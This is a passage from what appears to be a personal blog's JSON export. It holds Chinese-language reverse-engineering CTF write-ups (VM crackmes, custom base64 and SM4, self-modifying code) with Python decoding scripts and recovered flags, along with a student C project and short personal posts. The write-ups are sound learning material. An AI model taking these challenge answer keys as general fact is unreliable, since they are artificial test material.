v&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125;\"\"\"str = str.replace(\"\\n\", \"\")old = \"\"while(old != str): old = str str = str.replace(\"ra\", \"\") str = str.replace(\"ar\", \"\") str = str.replace(\"oh\", \"\") str = str.replace(\"ho\", \"\") str = str.replace(\"um\", \"\") str = str.replace(\"mu\", \"\")print(\"\\n\\n\\n\")h_cnt = 0o_cnt = 0for c in str: if(c == 'h'): h_cnt += 1 if(h_cnt == 3): h_cnt = 1 o_cnt = 0 print(\" \") elif(c == 'o'): o_cnt += 1 print(c, end=\"\") 可得以下字符串（VScode显示有点问题，打印到文件中就行） h[ur]ovMCh{mG}hv{aG}[ur]ovaaaMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovMCh{mG}hv{aG}[ur]ovrrrMCh{mG}hv{aG}[ur]ovaaMCh{mG}hv{aG}[ur]ovrMCh{mG}hv{aG}[ur]ovrrrrrMCh{mG}hv{aG}[ur]ovrMCh{mG}hv{aG}[ur]ovaMCh{mG}hv{aG}[ur]ovrrrrMCh{mG}hv{aG}[ur]ovaMCh{mG}hv{aG}[ur]ovMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovrrrrrMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovaaMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovrMCh{mG}hv{aG}[ur]ovrMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovrrrrrrMCh{mG}hv{aG}[ur]ovaaaMCh{mG}hv{aG}[ur]ovaMCh{mG}hv{aG}[ur]ovaMCh{mG}hv{aG}[ur]ovrrMCh{mG}hv{aG}[ur]ovaaMCh{mG}hv{aG}[ur]ovaMCh{mG}hv{aG}[ur]ovMCh{mG} 得到正向算法（递推公式）//MCh&#123;mG&#125;hv&#123;aG&#125;[ur]ov*j = *i + *a - 2 * (*i &amp; *a) //&#123;mG&#125;: *a += j j清空while(*j): *a++ *j-- //&#123;aG&#125;: i -= j j清空 while(*j): *i-- *j-- //[ur]: i = *a a清空while(*a) *a-- *i++ //r: *i++//a: *i--//v: j = i 经过研究 “v{ag}” 没有起到任何作用， “v” 将i的值取到了j中 然后i和j一同被清空了 “ov”中的“v”也没有起到作用，因为在后面j的值会被刷新 再次精简：（去掉v{aG} ） h[ur]oMCh{mG}h[ur]oaaaMCh{mG}h[ur]orrMCh{mG}h[ur]oMCh{mG}h[ur]orrrMCh{mG}h[ur]oaaMCh{mG}h[ur]orMCh{mG}h[ur]orrrrrMCh{mG}h[ur]orMCh{mG}h[ur]oaMCh{mG}h[ur]orrrrMCh{mG}h[ur]oaMCh{mG}h[ur]oMCh{mG}h[ur]orrMCh{mG}h[ur]orrMCh{mG}h[ur]orrrrrMCh{mG}h[ur]orrMCh{mG}h[ur]oaaMCh{mG}h[ur]orrMCh{mG}h[ur]orMCh{mG}h[ur]orMCh{mG}h[ur]orrMCh{mG}h[ur]oMCh{mG}h[ur]orrMCh{mG}h[ur]orrMCh{mG}h[ur]orrMCh{mG}h[ur]orrrrrrMCh{mG}h[ur]oaaaMCh{mG}h[ur]oaMCh{mG}h[ur]oaMCh{mG}h[ur]orrMCh{mG}h[ur]oaaMCh{mG}h[ur]oaMCh{mG}h[ur]oMCh{mG} 即 h 指针加一 [ur] 将*(a+1)全部转移到 i 中 o 指针减一 ar index改变 i = *(a+1) + index M j = *(a+1) + index + *a C j -= ((*(a+1) + index) &amp; *a) * 2 MC: j = *(a+1) + index + *a - (( *(a+1) + index) &amp; *a) * 2 h 指针加一 {mG} 把j的内容放到*(a+1) 递推公式：new(*(a+1)) = *(a+1) + index + *a - (( *( a+1) + index) &amp; *a) * 2 (index为 一大堆rraa 最后得到的值) 解密知道了*(a+1) 后面的新值，知道了 *(a+1) ，要求原来的 *(a+1)的值，只能通过枚举 enc = [27, 114, 17, 118, 8, 74, 126, 5, 55, 124, 31, 88, 104, 7,112, 7, 49, 108, 4, 47, 4, 105, 54, 77, 127, 8, 80, 12, 109, 28, 127, 80, 29, 96]index = []f = open(\"index.txt\", \"r\")for i in range(34): cnt = 0 s = f.readline() for c in s: if(c == 'r'): cnt += 1 if(c == 'a'): cnt -= 1 index.append(cnt)ans = \"\"for i in range(33, 0, -1): for c in range(128): if(enc[i] == c + index[i] + enc[i-1] - 2 * ((c + index[i]) &amp; enc[i-1])): ans = chr(c) + ans breakprint(ans) 输出：lag{D3v1L_H0mur4_f**k_y0uR_bra1N} 由于如下代码（IDA dump出来的） __isoc99_scanf(\"%s\", s); for ( i = 0; ; ++i ) &#123; v3 = i; if ( v3 &gt;= strlen(s) ) break; *((_DWORD *)array_input + i + 1LL) = s[i]; &#125; *(_DWORD *)array_input = s[strlen(s) - 1]; // 读取方式有点奇怪，最后一个字符放在开头的 输入的字符串并没有按照顺序存储，而是将输入的最后一个字符放到了内存开头，说明之后的操作全部都是从第二位开始的 通过最后一位和第一位的值同样可以逆推出原值，直接根据格式猜也行，flag嘛缺个”f”hhhh flag{D3v1L_H0mur4_f**k_y0uR_bra1N} ​ 本题用到了程序语言的化简，还有寻找规律的相关方法，遇到这样的题最好是先自己模拟一个循环节，找到规律再尝试写脚本解。因为并不是所有的虚拟机都是每步操作都可逆的23333","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"cgctf","slug":"write-up/cgctf","permalink":"https://mrh1s.top/categories/write-up/cgctf/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}],"author":"mrh929"},{"title":"学生信息管理系统","slug":"grade-store","date":"2019-05-06T11:05:19.000Z","updated":"2019-05-06T11:12:45.933Z","comments":true,"path":"posts/a4a48694/","link":"","permalink":"https://mrh1s.top/posts/a4a48694/","excerpt":"","text":"store-grades.docx 丢人现眼的大一下数据结构项目（我脸皮厚还是放网站上来存个档吧 用链表实现了对学生信息的读取，存储，排序的功能。 主要数据结构：链表，算法：冒泡排序 #include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;struct Student&#123; char sno[12]; char sname[10]; char sex[4]; char major[20]; Student *next; //指向后继数据结点&#125;*StudentList;struct Course&#123; char cno[10]; char cname[20]; int classHours; Course *next;&#125;*CourseList;struct Grade&#123; char sno[12]; char cno[10]; int score ; Grade *next;&#125;*GradeList;/*struct allinfo&#123; &#125;;*/FILE *Open_File(int who, int rw)&#123;//打开哪个文件，打开方式如何 FILE *p; switch(who)&#123; case 1:&#123; if(rw) p = fopen(\"student.dat\",\"w\"); else p = fopen(\"student.dat\",\"r\"); break; &#125; case 2:&#123; if(rw) p = fopen(\"course.dat\",\"w\"); else p = fopen(\"course.dat\",\"r\"); break; &#125; case 3:&#123; if(rw) p = fopen(\"courseGrade.dat\",\"w\"); else p = fopen(\"courseGrade.dat\",\"r\"); break; &#125; &#125; return p;&#125;/* 以下是关于学生的代码 */Student* Read_Student()&#123; FILE *StuFile = Open_File(1, 0);//read Student *head = (Student *) malloc(sizeof(Student)); Student *pre = head; while(!feof(StuFile))&#123; Student *p = (Student *) malloc(sizeof(Student)); fscanf(StuFile, \"%s%s%s%s\", p-&gt;sno, p-&gt;sname, p-&gt;sex, p-&gt;major); pre-&gt;next = p; pre = p; &#125; pre-&gt;next = NULL; fclose(StuFile); return head;&#125;void BubbleSort_Student()&#123; for(int i = 1; i &lt;= 10; i++)&#123; Student *p = StudentList-&gt;next; Student *pre = StudentList; while(p != NULL &amp;&amp; p-&gt;next != NULL )&#123;//存在两个可以比较的结点 Student *pnext = p-&gt;next; if(strcmp(p-&gt;sno, pnext-&gt;sno) &gt; 0)&#123; pre-&gt;next = pnext; p-&gt;next = pnext-&gt;next; pnext-&gt;next = p; &#125; pre = p; p = p-&gt;next; &#125; &#125; &#125;void Print_Student()&#123; Student *p = StudentList-&gt;next; printf(\"\\nStudentList\"); printf(\"\\n---------------------\\n\"); while(p != NULL)&#123; printf(\"%s %s %s %s\", p-&gt;sno, p-&gt;sname, p-&gt;sex, p-&gt;major); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------\\n\\n\");&#125;void Write_Student()&#123; FILE *StuFile = Open_File(1, 1);//write Student *p = (Student *) malloc(sizeof(Student)); for(int i = 1; i &lt;= 10; i++)&#123; printf(\"No.%2d:\", i); scanf(\"%s%s%s%s\", p-&gt;sno, p-&gt;sname, p-&gt;sex, p-&gt;major); fprintf(StuFile, \"%s %s %s %s\", p-&gt;sno, p-&gt;sname, p-&gt;sex, p-&gt;major); if(i != 10) fprintf(StuFile, \"\\n\"); &#125; free(p); fclose(StuFile); return;&#125;/* 以下是关于课程的代码 */Course* Read_Course()&#123; FILE *CourseFile = Open_File(2, 0);//read Course *head = (Course *) malloc(sizeof(Course)); Course *pre = head; while(!feof(CourseFile))&#123; Course *p = (Course *) malloc(sizeof(Course)); fscanf(CourseFile, \"%s%s%d\", p-&gt;cno, p-&gt;cname, &amp;p-&gt;classHours); pre-&gt;next = p; pre = p; &#125; pre-&gt;next = NULL; fclose(CourseFile); return head;&#125;void BubbleSort_Course()&#123; for(int i = 1; i &lt;= 10; i++)&#123; Course *p = CourseList-&gt;next; Course *pre = CourseList; while(p != NULL &amp;&amp; p-&gt;next != NULL )&#123;//存在两个可以比较的结点 Course *pnext = p-&gt;next; if(strcmp(p-&gt;cno, pnext-&gt;cno) &gt; 0)&#123; pre-&gt;next = pnext; p-&gt;next = pnext-&gt;next; pnext-&gt;next = p; &#125; pre = p; p = p-&gt;next; &#125; &#125; &#125;void Print_Course()&#123; Course *p = CourseList-&gt;next; printf(\"\\nCourseList\"); printf(\"\\n---------------------\\n\"); while(p != NULL)&#123; printf(\"%s %s %d\", p-&gt;cno, p-&gt;cname, p-&gt;classHours); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------\\n\\n\");&#125;void Write_Course()&#123; FILE *CourseFile = Open_File(2, 1);//write Course *p = (Course *) malloc(sizeof(Course)); for(int i = 1; i &lt;= 3; i++)&#123; printf(\"No.%2d:\", i); scanf(\"%s%s%d\", p-&gt;cno, p-&gt;cname, &amp;p-&gt;classHours); fprintf(CourseFile, \"%s %s %d\", p-&gt;cno, p-&gt;cname, p-&gt;classHours); if(i != 3) fprintf(CourseFile, \"\\n\"); &#125; free(p); fclose(CourseFile); return;&#125;/* 以下是关于成绩的代码 */Grade* Read_Grade()&#123; FILE *GradeFile = Open_File(3, 0);//read Grade *head = (Grade *) malloc(sizeof(Grade)); Grade *pre = head; while(!feof(GradeFile))&#123; Grade *p = (Grade *) malloc(sizeof(Grade)); fscanf(GradeFile, \"%s%s%d\", p-&gt;sno, p-&gt;cno, &amp;p-&gt;score); pre-&gt;next = p; pre = p; &#125; pre-&gt;next = NULL; fclose(GradeFile); return head;&#125;void BubbleSort_Grade()&#123; for(int i = 1; i &lt;= 10; i++)&#123; Grade *p = GradeList-&gt;next; Grade *pre = GradeList; while(p != NULL &amp;&amp; p-&gt;next != NULL )&#123;//存在两个可以比较的结点 Grade *pnext = p-&gt;next; if(strcmp(p-&gt;sno, pnext-&gt;sno) &gt; 0 || (strcmp(p-&gt;sno, pnext-&gt;sno) == 0 &amp;&amp; strcmp(p-&gt;cno, pnext-&gt;cno) &gt; 0) )&#123; pre-&gt;next = pnext; p-&gt;next = pnext-&gt;next; pnext-&gt;next = p; &#125; pre = p; p = p-&gt;next; &#125; &#125;&#125;void Print_Grade()&#123; Grade *p = GradeList-&gt;next; printf(\"\\nGradeList\"); printf(\"\\n---------------------\\n\"); while(p != NULL)&#123; printf(\"%s %s %d\", p-&gt;sno, p-&gt;cno, p-&gt;score); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------\\n\\n\");&#125;void Write_Grade()&#123; FILE *GradeFile = Open_File(3, 1);//write Grade *p = (Grade *) malloc(sizeof(Grade)); for(int i = 1; i &lt;= 10; i++)&#123; printf(\"No.%2d:\", i); scanf(\"%s%s%d\", p-&gt;sno, p-&gt;cno, &amp;p-&gt;score); fprintf(GradeFile, \"%s %s %d\", p-&gt;sno, p-&gt;cno, p-&gt;score); if(i != 10) fprintf(GradeFile, \"\\n\"); &#125; free(p); fclose(GradeFile); return;&#125;void BubbleSort_StudentsGrade()&#123; for(int i = 1; i &lt;= 10; i++)&#123; Grade *p = GradeList-&gt;next; Grade *pre = GradeList; while(p != NULL &amp;&amp; p-&gt;next != NULL )&#123;//存在两个可以比较的结点 Grade *pnext = p-&gt;next; if(p-&gt;score &lt; pnext-&gt;score)&#123; pre-&gt;next = pnext; p-&gt;next = pnext-&gt;next; pnext-&gt;next = p; &#125; pre = p; p = p-&gt;next; &#125; &#125;&#125;Student *Find_Student(char *num)&#123; Student *p = StudentList-&gt;next; do&#123; if(strcmp(p-&gt;sno, num) == 0) return p; p = p-&gt;next; &#125;while(p != NULL); p = (Student*) malloc(sizeof(Student)); char temp[3] = \"-1\"; strcpy(p-&gt;major, temp); strcpy(p-&gt;sex, temp); strcpy(p-&gt;sname, temp); strcpy(p-&gt;sno, temp); p-&gt;next = NULL; return p;//返回错误 &#125;Course *Find_Course(char *num)&#123; Course *p = CourseList-&gt;next; do&#123; if(strcmp(p-&gt;cno, num) == 0) return p; p = p-&gt;next; &#125;while(p != NULL); p = (Course*) malloc(sizeof(Course)); char temp[3] = \"-1\"; strcpy(p-&gt;cname, temp); strcpy(p-&gt;cno, temp); p-&gt;classHours = -1; p-&gt;next = NULL; return p;//返回错误 &#125;void Print_All(Grade *p)&#123; Student *s = Find_Student(p-&gt;sno); Course *c = Find_Course(p-&gt;cno); printf(\"%6s %6s %6s %6s %3d\", s-&gt;sno, s-&gt;sname, s-&gt;major, c-&gt;cname, p-&gt;score);&#125;void Print_Seven()&#123;//Task7 Grade *p = GradeList-&gt;next; printf(\"\\nGradeList\"); printf(\"\\nnumber name major course grade\"); printf(\"\\n---------------------------------------\\n\"); while(p != NULL)&#123; Print_All(p); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------------------------\\n\\n\");&#125;void Print_Eight(char* num)&#123;//Task8 指定课程号 Grade *p = GradeList-&gt;next; printf(\"\\nGradeList\"); printf(\"\\nnumber name major course grade\"); printf(\"\\n---------------------------------------\\n\"); while(p != NULL)&#123; if(strcmp(p-&gt;cno, num) == 0) Print_All(p); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------------------------\\n\\n\");&#125;void Print_Nine()&#123;//Task9 Grade *p = GradeList-&gt;next; printf(\"\\nGradeList\"); printf(\"\\nnumber name major course grade\"); printf(\"\\n---------------------------------------\\n\"); while(p != NULL)&#123; if(p-&gt;score &lt; 60) Print_All(p); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------------------------\\n\\n\");&#125;void ReverseStudent()&#123; Student *head = (Student*) malloc(sizeof(Student)); Student *p = StudentList-&gt;next; head-&gt;next = NULL; while(p != NULL)&#123; Student *t = p-&gt;next;//暂时保存p的下一个结点 p-&gt;next = head-&gt;next; head-&gt;next = p; p = t; &#125; StudentList = head;&#125;void Queue_Push(Grade *p, Grade *&amp;top, Grade *&amp;rear)&#123; if(top-&gt;next == NULL)&#123; top-&gt;next = p; rear-&gt;next = p; &#125; else&#123; p-&gt;next = top; top = p; &#125; &#125;Grade* Queue_Pop(Grade *&amp;top, Grade *&amp;rear)&#123; if(top-&gt;next == rear-&gt;next)&#123; top-&gt;next = rear-&gt;next = NULL; return top-&gt;next; &#125;else&#123; rear-&gt;next = top-&gt;next; return rear-&gt;next; &#125; &#125; void Print_Eleven(Grade *top, Grade *rear)&#123; Grade *p = Queue_Pop(top, rear); printf(\"\\nGradeList\"); printf(\"\\nnumber name major course grade\"); printf(\"\\n---------------------------------------\\n\"); while(p != NULL)&#123; Print_All(p); p = p-&gt;next; if(p != NULL) printf(\"\\n\"); &#125; printf(\"\\n---------------------------------------\\n\\n\");&#125;int main()&#123; int opt; Student *HEAD = NULL; printf(\"Welcome to Students' score system!\\n\"); printf(\"1.Input students.\\n\"); printf(\"2.Input courses.\\n\"); printf(\"3.Input grades.\\n\"); printf(\"4.Output students.\\n\"); printf(\"5.Output courses.\\n\"); printf(\"6.Output grades.\\n\"); printf(\"7.Output all.\\n\"); printf(\"8.Output all of a course.\\n\"); printf(\"9.Output all below 60.\\n\"); printf(\"10.Reverse students.\\n\"); printf(\"11.Output all.\\n\"); while(1)&#123; printf(\"\\nPlease input an option:\"); scanf(\"%d\", &amp;opt); if(opt == -1) break; switch(opt)&#123; case 1:&#123; Write_Student(); printf(\"done.\\n\"); break; &#125; case 2:&#123; Write_Course(); printf(\"done.\\n\"); break; &#125; case 3:&#123; Write_Grade(); printf(\"done.\\n\"); break; &#125; case 4:&#123; StudentList = Read_Student(); BubbleSort_Student(); Print_Student(); break; &#125; case 5:&#123; CourseList = Read_Course(); BubbleSort_Course(); Print_Course(); break; &#125; case 6:&#123; GradeList = Read_Grade(); BubbleSort_Grade(); Print_Grade(); break; &#125; case 7:&#123; StudentList = Read_Student(); CourseList = Read_Course(); GradeList = Read_Grade(); BubbleSort_StudentsGrade();//按照成绩排序 Print_Seven(); break; &#125; case 8:&#123; StudentList = Read_Student(); CourseList = Read_Course(); GradeList = Read_Grade(); BubbleSort_StudentsGrade();//按照成绩排序 char str[10]; printf(\"input course name:\"); scanf(\"%s\", str); Print_Eight(str); break; &#125; case 9:&#123; StudentList = Read_Student(); CourseList = Read_Course(); GradeList = Read_Grade(); BubbleSort_StudentsGrade();//按照成绩排序 Print_Nine(); break; &#125; case 10:&#123; StudentList = Read_Student(); ReverseStudent();//逆序生成新的链表 Print_Student();//输出该链表 break; &#125; case 11:&#123; StudentList = Read_Student(); CourseList = Read_Course(); GradeList = Read_Grade(); BubbleSort_StudentsGrade();//按照成绩排序 Print_Seven(); break; &#125; &#125; &#125; &#125;","categories":[{"name":"project","slug":"project","permalink":"https://mrh1s.top/categories/project/"}],"tags":[],"author":"mrh929"},{"title":"To Be Alone","slug":"to-be-alone","date":"2019-05-04T11:11:00.000Z","updated":"2019-05-04T15:39:44.428Z","comments":true,"path":"posts/25290751/","link":"","permalink":"https://mrh1s.top/posts/25290751/","excerpt":"","text":"你的生活难道是过给别人看的？ 一个人成熟的标志之一就是：明白每天发生在自己身上的99%的事情对于别人而言根本毫无意义。 ——Mark Bauerlein 有的人爱热闹，爱交流，爱群居生活。 但独处、安静和不动声色同样被一些人需要着。 合群有合群的好，独处也有独处的好。无论哪种生活方式，自己觉得舒适不就行了 ？生活充实有效率不就行了？ 都大学生了，已经是一个完全独立对自己负责的成年人了。 每个人都有着自己的目标，都怀着自己的心事，都走在自己的轨迹上，都忙着自己的故事。 每个人都是一条河流，每条河流都有自己的方向。 没有交集是正常的，独处乃至孤独都是常态，哪有什么丢不丢人的？ 与其关心这些，你不如关心 大学生挂科丢不丢人？大学生四六级没过丢不丢人？大学生GPA/加权垫底丢不丢人？大学生没拿过奖学金丢不丢人？ 生活该有的样子是什么？ 一言以蔽之：阅己，悦己，越己。 链接：https://www.zhihu.com/question/307092372/answer/621757215 来源：知乎","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[]},{"title":"Migration_Success!","slug":"Migration-Success","date":"2019-05-03T11:24:16.000Z","updated":"2019-05-05T05:51:59.612Z","comments":true,"path":"posts/ebedb07/","link":"","permalink":"https://mrh1s.top/posts/ebedb07/","excerpt":"","text":"把wordpress里面的所有内容迁移到了github page 中途花了不少功夫 wordpress网页转md各种格式错误，文件引用错误，需要手动改 以后就用这个静态网站啦！ 排版比wordpress舒服多了，而且不用租服务器 回头我再去研究研究hexo的主题配置（咕 （划去，主题已经配置好 并且把之前所有的非markdown文章的格式改了一下，使其更好看 可恶的强迫症","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[]},{"title":"bbvvmm","slug":"bbvvmm","date":"2019-04-28T04:56:40.000Z","updated":"2019-09-14T03:13:03.741Z","comments":true,"path":"posts/ea74c872/","link":"","permalink":"https://mrh1s.top/posts/ea74c872/","excerpt":"","text":"bbvvmm用ida打开 可以发现程序读入了用户名和密码，然后对用户名和密码进行了加密，如果用户名和密码校验正确，那么就cat flag 首先是用户名，用户名先进行一层加密，后进行sm4加密，最后进行变表base64转换为了一串密文 首先解决base64： import base64tab2 = \"IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y=\"tab1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"s2 = \"RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y=\"s1 = \"\"for c in s2: for i in range(len(tab2)): if(tab2[i] == c): s1 += tab1[i] breakprint(base64.b64decode(s1)) 得到“EF468DBAF985B2509C9E200CF3525AB6” 然后是sm4加密算法，直接在网上找轮子解密得到“36 32 36 31 36 34 37 32 36 35 37 32 33 31 33 32” 最后两次转化成ascii第一次62 61 54 72 65 72 31 32第二次b a d r e r 1 2 然后就得到了用户名 对于密码，并不清楚这个密码使用了什么加密算法，只清楚这是一个虚拟机，有几百个操作数，好像是对密码进行了某种运算，最后将运算结果保存到内存的某个地方，如果这个内存数据为0，那么密码便正确 直接开ida动态远程调试：能找到一个类似于栈的结构（一直+4 -4），在内存中找到这个栈对应的位置 通过不断地循环fastcall，看到栈中出现了我刚刚输入的字符串，并且旁边是一堆奇特字符串，而且长度也是六位，于是尝试交上去，成功 getshell的时候：输入密码之后不能直接按回车键，这样会多输入一个 \\n，而应该ctrl+d，输入文本中断符，然后拿到flag","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nationalCTF_20190421","slug":"write-up/nationalCTF-20190421","permalink":"https://mrh1s.top/categories/write-up/nationalCTF-20190421/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"},{"name":"sm4","slug":"sm4","permalink":"https://mrh1s.top/tags/sm4/"},{"name":"base64","slug":"base64","permalink":"https://mrh1s.top/tags/base64/"}]},{"title":"南京邮电大学 RE-WxyVM2","slug":"e5-8d-97-e4-ba-ac-e9-82-ae-e7-94-b5-e5-a4-a7-e5-ad-a6-re-wxyvm2","date":"2019-04-28T04:51:47.000Z","updated":"2019-05-07T15:57:41.467Z","comments":true,"path":"posts/7f12b338/","link":"","permalink":"https://mrh1s.top/posts/7f12b338/","excerpt":"","text":"WxyVM2 大概是要读这个程序里面的一段汇编代码，这段汇编代码非常长，连ida都无法反编译，但是非常有规律，可以通过写脚本来还原 这是初始化代码，估计是对加密的字符串进行还原的： .text:00000000004005FE mov cs:dword_694140, 9C06AA99h.text:0000000000400608 mov cs:dword_694144, 0B4B2B03Fh.text:0000000000400612 mov cs:dword_694148, 0C51F73CFh.text:000000000040061C mov cs:dword_69414C, 223520F8h.text:0000000000400626 mov cs:dword_694150, 0C0C53B9h.text:0000000000400630 mov cs:dword_694154, 0B59C78EAh.text:000000000040063A mov cs:dword_694158, 0F7DE2D34h.text:0000000000400644 mov cs:dword_69415C, 0B27EEE2Ch 类似于下面这样的 .text:000000000048BAF1 mov edx, cs:dword_694174.text:000000000048BAF7 mov eax, cs:dword_694178.text:000000000048BAFD xor eax, edx.text:000000000048BAFF mov cs:dword_694178, eax .text:000000000048B93B movzx eax, cs:byte_694116.text:000000000048B93C add eax, 7Dh.text:000000000048B93F mov cs:byte_694116, al .text:000000000048B95C movzx eax, cs:byte_694100.text:000000000048B95C xor eax, 6Ah.text:000000000048B95F mov cs:byte_694100, al .text:000000000041DD09 movzx eax, cs:byte_69410F.text:000000000041DD09 sub eax, 6Eh.text:000000000041DD0C mov cs:byte_69410F, al 还有一种 我 mov 我 自 己 .text:000000000040093E movzx eax, cs:byte_694114.text:0000000000400945 mov cs:byte_694114, al ida可以修改配置文件，这样就可以反编译了 byte_694100是字符串读入的起始地址 读取18h字节 .text:00000000004005CD call _puts.text:00000000004005D2 mov esi, offset byte_694100.text:00000000004005D7 mov edi, offset format ; &quot;%s&quot;.text:00000000004005DC mov eax, 0.text:00000000004005E1 call _ssanf 694100~694117 查看汇编代码后发现很多操作都超出了这个内存的范围，而且最后也没有对这个内存进行任何修改，那么就应该直接舍去 先将所有汇编代码dump下来，用脚本筛掉垃圾代码 def get_string(line): l = [] s = \"\" for i in range(len(line)): if(line[i] == ' ' or line[i] == ',' or i == len(line) - 1):#如果读取到了末尾 if(len(s) != 0): l.append(s) s = \"\" else: s = s + line[i] return li = 0f = open(\"code.dump\", \"r\")fout = open(\"decode.txt\", \"w\")#fout.write(\"Below is decoded code.\\n(format:) addr [opt] num\\n\")while(1): line = f.readline() i += 1 if(line == \"\"): print(\"正常退出\") fout.close() break tab = get_string(line)#获取到一个汇编指令 if(tab[1] == \"mov\"):#如果是垃圾指令，就直接跳过 line = f.readline() i += 1 line = f.readline() i += 1 line = f.readline() i += 1 elif(tab[1] == \"movzx\"): addr = tab[3] addr = \"0x\" + addr[8::]#获取地址信息 addr_num = int(addr, 16) addr_num -= 6897920 #减去起始地址 得到偏移量 addr = str(addr_num) line = f.readline() i += 1 tab = get_string(line) if(tab[1] != \"mov\"):#只有当这个指令不是mov的时候才进行判断，因为有一种垃圾指令是自己mov自己 if(tab[1] == \"add\"): opt = \"+=\" elif(tab[1] == \"xor\"): opt = \"^=\" elif(tab[1] == \"sub\"): opt = \"-=\" else: print(\"something goes wrong! \" + tab[1] + \" at :\" + str(i)) break s = tab[3] # s = s[:-1:] # s = \"0x\" + s if(s[-1] == \"h\"): s = s[:-1] s = \"0x\" + s s = str(int(s, 16) % 128) line = f.readline() i += 1 fout.write(addr + \" \" + opt + \" \" + s + \"\\n\") else: print(\"something goes wrong! \" + tab[1] + \" at :\" + str(i)) breakf.close()fout.close() 得到类似于如下的数据 23 += 11 3 += 31 5 += 78 23 += 109 2 -= 25 1 -= 48 11 += 123 13 ^= 38 23 ^= 89 12 += 3 11 -= 5 13 += 75 4 ^= 72 5 -= 88 4 -= 107 0 ^= 60 23 ^= 27再写python进行逆向计算： def get_string(line): l = [] s = \"\" for i in range(len(line)): if(line[i] == ' ' ):#如果读取到了末尾 if(len(s) != 0): l.append(s) s = \"\" else: s = s + line[i] if(len(s) != 0): l.append(s) return lenc =[0xC0,0x85,0xF9,0x6C,0xE2,0x14,0xBB,0xe4,0xd,0x59,0x1c,0x23,0x88,0x6e,0x9b,0xca,0xba,0x5c,0x37,0xfff,0x48,0xd8,0x1f,0xab,0xa5] ​ f = open(\"decode.txt\", \"r\")all = []i = -1while(1): line = f.readline() if(line == \"\"): break i += 1 all.append(line)while(i &gt;= 0): line = all[i] tab = get_string(line) i -= 1 if(tab[1] == \"+=\"): enc[int(tab[0])] -= int(tab[2]) elif(tab[1] == \"-=\"): enc[int(tab[0])] += int(tab[2]) else: enc[int(tab[0])] ^= int(tab[2]) enc[int(tab[0])] %= 128ans = \"\"for c in enc: ans = ans + chr(c)print(ans) ​","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"cgctf","slug":"write-up/cgctf","permalink":"https://mrh1s.top/categories/write-up/cgctf/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}]},{"title":"壳相关","slug":"e5-a3-b3-e7-9b-b8-e5-85-b3","date":"2019-04-12T17:22:09.000Z","updated":"2019-05-08T04:55:23.797Z","comments":true,"path":"posts/6d13a265/","link":"","permalink":"https://mrh1s.top/posts/6d13a265/","excerpt":"","text":"壳主要是用来混淆代码，让你找不到程序入口点的，通常带壳程序可以用PEid来分析并且用相应的工具去除，如果去除失败的话，就只能手动调试了 重点：ESP定律法https://blog.csdn.net/qiurisuixiang/article/details/7649799","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[{"name":"RE_Dynamic","slug":"RE-Dynamic","permalink":"https://mrh1s.top/tags/RE-Dynamic/"}]},{"title":"ShinyShot!","slug":"shinyshot","date":"2019-03-22T03:00:30.000Z","updated":"2019-05-08T04:55:52.469Z","comments":true,"path":"posts/ab82ece6/","link":"","permalink":"https://mrh1s.top/posts/ab82ece6/","excerpt":"","text":"utf-8’ ‘ShinyShot! 这个程序主要是利用了smc（动态代码修改技术） 首先我们向程序里面输入一个数，然后这个程序利用这个数去修改了一些程序的代码 然后输入一个字符串，将字符串base64加密后得到的密文与程序尾所保存的字符串进行比较，如果相同，则flag正确 程序在我们输入了一个数字之后 执行了 *((_BYTE *)TopLevelExceptionFilter + (cout &gt;&gt; 3)) ^= 1 &lt;&lt; (cout &amp; 7); 这个指令，TopLevelExceptionFilter的意义暂时不明白，大概就是一个指向某个内存的指针，简记为T, 值为0x401000 程序把*(p + (cout &gt;&gt; 3)) 处的数据异或了一个1 &lt;&lt; (cout &amp; 7) 其实1 &lt;&lt; (cout &amp; 7)就是将1左移了几位 我们看到后面的 .text:004018DE EB 15 jmp short loc_4018F5.text:004018E0 ; 